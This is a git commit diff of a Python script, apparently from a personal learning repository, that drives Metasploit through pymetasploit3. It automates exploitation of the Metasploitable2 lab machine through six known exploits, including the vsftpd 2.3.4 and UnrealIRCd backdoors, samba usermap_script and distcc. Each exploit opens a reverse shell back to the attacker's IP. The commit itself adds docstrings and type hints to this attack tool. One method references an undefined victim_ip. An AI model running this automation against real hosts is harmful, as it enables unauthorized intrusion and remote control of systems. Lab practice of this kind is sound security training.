e03be3517e0ffbbfe088ecb9815855e5a2918b45
soytupadrrre <victorluque314@gmail.com>
2023-02-18 20:27:31 +0100

    docstrings, formatting and minor fixes

--- hacking_python/hpp2.py
+++ hacking_python/hpp2.py
@@ -1,13 +1,25 @@
 import subprocess
 import time
 import sys
-import netifaces  # pip install netifaces
+from typing import Optional, Callable, Dict
+# pip install netifaces
+import netifaces
 # pip install pymetasploit3
 from pymetasploit3.msfrpc import MsfRpcClient, SessionManager
 
 
 class PyMetasploit:
+    """
+    Clase que permite interactuar con Metasploit Framework desde Python
+
+    :param msfclient: Objeto de la API de Metasploit Framework
+    :type msfclient: MsfRpcClient
+    :param attacker_ip: IP del atacante
+    :type attacker_ip: str
+    """
+
     def __init__(self, msfclient, attacker_ip):
+        """Constructor de la clase"""
         self.msfclient = msfclient
         self.attacker_ip = attacker_ip
         self.session_manager = SessionManager(msfclient)
@@ -15,13 +27,21 @@ class PyMetasploit:
         self.payload = None
         self.console = None
 
-    def set_exploit(self, name, **options):
+    def set_exploit(self, name: str, **kwargs) -> None:
+        """
+        Configura el exploit a utilizar
+
+        :param name: Nombre del exploit
+        :type name: str
+        :param options: Opciones del exploit
+        :type options: dict
+        """
         # Set exploit
         print(f"Setting exploit: {name}")
         expl = self.msfclient.modules.use("exploit", name)
         expl.options
         # Lowercase options keys
-        options = {k.lower(): v for k, v in options.items()}
+        options = {k.lower(): v for k, v in kwargs.items()}
         conditions = {
             "rhosts": "rhosts" in options.keys(),
             "rport": "rport" in options.keys()
@@ -32,11 +52,19 @@ class PyMetasploit:
                 expl[k.upper()] = options[k]
         self.exploit = expl
 
-    def set_payload(self, name, **options):
+    def set_payload(self, name: str, **kwargs) -> None:
+        """
+        Configura el payload a utilizar
+
+        :param name: Nombre del payload
+        :type name: str
+        :param options: Opciones del payload
+        :type options: dict
+        """
         print(f"Setting payload: {name}")
         pl = self.msfclient.modules.use('payload', name)
         pl.options
-        options = {k.lower(): v for k, v in options.items()}
+        options = {k.lower(): v for k, v in kwargs.items()}
         conditions = {
             "lhost": "lhost" in options.keys(),
             "lport": "lport" in options.keys()
@@ -47,11 +75,20 @@ class PyMetasploit:
                 pl[k.upper()] = options[k]
         self.payload = pl
 
-    def set_console(self):
+    def set_console(self) -> None:
+        """
+        Configura la consola de Metasploit Framework
+        """
         cid = self.msfclient.consoles.console().cid
         self.console = self.msfclient.consoles.console(cid)
 
-    def _get_session_id(self):
+    def _get_session_id(self) -> Optional[int]:
+        """
+        Obtiene el ID de la sesión
+
+        :return: ID de la sesión, None si no se ha encontrado
+        :rtype: Optional[int]
+        """
         cont = 0
         sid = None
         while cont < 3:
@@ -70,10 +107,33 @@ class PyMetasploit:
 
         return sid
 
-    def _get_shell(self, sid):
+    def _get_shell(self, sid: str):
+        """
+        Obtiene el shell de la sesión
+
+        :param sid: ID de la sesión
+        :type sid: str
+        :return: Shell de la sesión
+        :rtype: ShellSession
+        """
         return self.msfclient.sessions.session(sid)
 
     def _pretty_cli(self, shell, victim_ip, need_refresh=True):
+        """
+        Obtiene el prompt de la sesión
+
+        El formato del prompt es el siguiente:
+            Reverse-Shell - (user@victim_ip) - [dir] $
+
+        :param shell: Shell de la sesión
+        :type shell: ShellSession
+        :param victim_ip: IP de la víctima
+        :type victim_ip: str
+        :param need_refresh: Indica si se debe refrescar el prompt, defaults to True
+        :type need_refresh: bool, optional
+        :return: Prompt de la sesión
+        :rtype: str
+        """
         if need_refresh:
             return "Press Enter to access the reverse shell "
         text = "Reverse-Shell - "
@@ -97,7 +157,13 @@ class PyMetasploit:
         text += " $ "
         return text
 
-    def _end_session(self, sid):
+    def _end_session(self, sid: str):
+        """
+        Finaliza la sesión
+
+        :param sid: ID de la sesión
+        :type sid: str
+        """
         close = default_input(
             f"Do you want to close the session {sid}? [y/N] ", default="N")
         while close not in ["y", "Y", "N", "n"]:
@@ -109,7 +175,13 @@ class PyMetasploit:
             print(f"Session {sid} closed")
         print("Finished connection")
 
-    def run(self, *, victim_ip=None):
+    def run(self, *, victim_ip: Optional[str] = None) -> None:
+        """
+        Ejecuta el exploit
+
+        :param victim_ip: IP de la víctima, defaults to None
+        :type victim_ip: Optional[str], optional
+        """
         sid = self._get_session_id()
         if sid == None:
             print("Unable to find/create a session id")
@@ -131,28 +203,63 @@ class PyMetasploit:
 
 
 class VictimHost:
+    """
+    Clase que representa una máquina objetivo
+
+    :raises ConnectionError: Si la máquina objetivo no está disponible
+    :param victim_ip: IP de la máquina objetivo
+    :type victim_ip: str
+    """
     _exploit_choices = {}
 
-    def __init__(self, victim_ip):
+    def __init__(self, victim_ip: str):
+        """Constructor de la clase VictimHost"""
         self.victim_ip = victim_ip
         self._check_host_reachable()
 
     @property
-    def available_exploits(self):
+    def available_exploits(self) -> Dict[str, str]:
+        """
+        Propiedad (Getter) que devuelve los exploits disponibles
+
+        :return: Exploits disponibles
+        :rtype: Dict[str, str]
+        """
         return {str(i): v for i, v in enumerate(list(self._exploit_choices.keys()))}
 
     def _check_host_reachable(self):
+        """
+        Método que comprueba si la máquina objetivo está disponible utilizando ping
+
+        :raises ConnectionError: Si la máquina objetivo no está disponible
+        """
         result = subprocess.call(["ping", "-c", "1", "-w", "1", self.victim_ip],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         if result != 0:
             raise ConnectionError("Host is not reachable")
 
-    def select_exploit(self, name):
+    def select_exploit(self, name: str) -> Optional[Callable[[PyMetasploit], None]]:
+        """
+        Método que selecciona el exploit a utilizar
+
+        :param name: Nombre del exploit a utilizar
+        :type name: str
+        :return: Exploit seleccionado, None si no existe
+        :rtype: Optional[Callable[[PyMetasploit], None]]
+        """
         return self._exploit_choices.get(name, None)
 
 
 class Metasploitable2(VictimHost):
-    def __init__(self, victim_ip) -> None:
+    """
+    Clase que representa a la máquina Metasploitable2
+
+    :param victim_ip: IP de la máquina Metasploitable2
+    :type victim_ip: str
+    """
+
+    def __init__(self, victim_ip: str) -> None:
+        """Constructor de la clase Metasploitable2"""
         super().__init__(victim_ip)
         self._exploit_choices = {
             "java_rmi_server": self._exploit_java_rmi_server,
@@ -163,7 +270,13 @@ class Metasploitable2(VictimHost):
             "vsftpd_234_backdoor": self._exploit_vsftpd_234_backdoor
         }
 
-    def _exploit_java_rmi_server(self, metasploit: PyMetasploit):
+    def _exploit_java_rmi_server(self, metasploit: PyMetasploit) -> None:
+        """
+        Explotación automatizada para java_rmi_server
+
+        :param metasploit: Instancia de PyMetasploit
+        :type metasploit: PyMetasploit
+        """
         metasploit.set_exploit(
             name="multi/misc/java_rmi_server", rhosts=self.victim_ip, rport=1099)
         metasploit.set_payload(
@@ -171,7 +284,13 @@ class Metasploitable2(VictimHost):
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
-    def _exploit_distccd(self, metasploit: PyMetasploit):
+    def _exploit_distccd(self, metasploit: PyMetasploit) -> None:
+        """
+        Explotación automatizada para distccd
+
+        :param metasploit: Instancia de PyMetasploit
+        :type metasploit: PyMetasploit
+        """
         metasploit.set_exploit(name="unix/misc/distcc_exec",
                                rhosts=self.victim_ip, rport=3632)
         metasploit.set_payload(name="cmd/unix/reverse",
@@ -179,7 +298,13 @@ class Metasploitable2(VictimHost):
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
-    def _exploit_unreal_ircd_3281_backdoor(self, metasploit: PyMetasploit):
+    def _exploit_unreal_ircd_3281_backdoor(self, metasploit: PyMetasploit) -> None:
+        """
+        Explotación automatizada para unreal_ircd_3281_backdoor
+
+        :param metasploit: Instancia de PyMetasploit
+        :type metasploit: PyMetasploit
+        """
         metasploit.set_exploit(
             name="unix/irc/unreal_ircd_3281_backdoor", rhosts=self.victim_ip, rport=6667)
         metasploit.set_payload(name="cmd/unix/reverse",
@@ -187,7 +312,13 @@ class Metasploitable2(VictimHost):
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
-    def _exploit_usermap(self, metasploit: PyMetasploit):
+    def _exploit_usermap(self, metasploit: PyMetasploit) -> None:
+        """
+        Explotación automatizada para usermap
+
+        :param metasploit: Instancia de PyMetasploit
+        :type metasploit: PyMetasploit
+        """
         metasploit.set_exploit(
             name="multi/samba/usermap_script", rhosts=self.victim_ip, rport=139)
         metasploit.set_payload(name="cmd/unix/reverse",
@@ -195,7 +326,13 @@ class Metasploitable2(VictimHost):
         metasploit.set_console()
         metasploit.run(victim_ip=victim_ip)
 
-    def _exploit_apache_twiki(self, metasploit: PyMetasploit):
+    def _exploit_apache_twiki(self, metasploit: PyMetasploit) -> None:
+        """
+        Explotación automatizada para apache twiki
+
+        :param metasploit: Instancia de PyMetasploit
+        :type metasploit: PyMetasploit
+        """
         metasploit.set_exploit(
             name="unix/webapp/twiki_history", rhosts=self.victim_ip, rport=80)
         metasploit.set_payload(name="cmd/unix/reverse",
@@ -203,7 +340,13 @@ class Metasploitable2(VictimHost):
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
-    def _exploit_vsftpd_234_backdoor(self, metasploit: PyMetasploit):
+    def _exploit_vsftpd_234_backdoor(self, metasploit: PyMetasploit) -> None:
+        """
+        Explotación automatizada para vsftpd 2.3.4
+
+        :param metasploit: Instancia de PyMetasploit
+        :type metasploit: PyMetasploit
+        """
         metasploit.set_exploit(
             name="unix/ftp/vsftpd_234_backdoor", rhosts=self.victim_ip, rport=21)
         metasploit.set_payload(name="cmd/unix/interact")
@@ -211,12 +354,28 @@ class Metasploitable2(VictimHost):
         metasploit.run(victim_ip=self.victim_ip)
 
 
-def default_input(text, default=""):
+def default_input(text, default="") -> str:
+    """
+    Input con valor por defecto
+
+    :param text: Texto a mostrar en el input
+    :type text: str
+    :param default: Valor por defecto, por defecto ""
+    :type default: str, optional
+    :return: Valor introducido por el usuario o el valor por defecto
+    :rtype: str
+    """
     result = input(text)
     return result if result else default
 
 
-def suggest_local_ip():
+def suggest_local_ip() -> Optional[str]:
+    """
+    Sugerencia de IP local
+
+    :return: IP local
+    :rtype: str
+    """
     interfaces = netifaces.interfaces()
     for interface in interfaces:
         addresses = netifaces.ifaddresses(interface)
@@ -228,7 +387,15 @@ def suggest_local_ip():
     return None
 
 
-def exploit_menu(victim: VictimHost):
+def exploit_menu(victim: VictimHost) -> Optional[Callable[[PyMetasploit], None]]:
+    """
+    Menu de selección de exploit
+
+    :param victim: Host Victima
+    :type victim: VictimHost
+    :return: Nombre del exploit seleccionado
+    :rtype: str
+    """
     text = "ID\t| Payload\n"
     text += "-"*8 + "+" + "-"*27 + "\n"
     for k, v in victim.available_exploits.items():
@@ -240,7 +407,7 @@ def exploit_menu(victim: VictimHost):
             break
         for k, v in victim.available_exploits.items():
             if selected.lower() == k or selected.lower() == v:
-                return v
+                return victim.select_exploit(v)
 
 
 if __name__ == "__main__":
@@ -254,9 +421,9 @@ if __name__ == "__main__":
 
     while True:
         try:
-            name = exploit_menu(metasploitable2)
-            if name:
-                exploitation = metasploitable2.select_exploit(name)(metasploit)
+            exploit = exploit_menu(metasploitable2)
+            if exploit:
+                exploitation = exploit(metasploit)
                 action = default_input(
                     "Continue exploiting? [Y/n]: ", default="Y")
                 if action in ["n", "N"]:
